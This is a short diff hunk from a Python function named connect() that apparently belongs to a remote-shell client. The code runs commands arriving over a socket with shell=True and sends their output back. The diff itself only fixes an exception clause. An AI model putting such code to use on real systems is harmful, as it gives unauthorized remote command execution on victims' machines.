@@ -48,7 +48,7 @@ def connect():
 			try:
 				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 				socketnoise.say(s, str(CMD.stdout.read().decode('utf-8')) + str(CMD.stderr.read().decode('utf-8')) ) 
-			except error as e:
+			except Exception as e:
 				socketnoise.say(s, f'[ERROR] {e}')
 
 	return
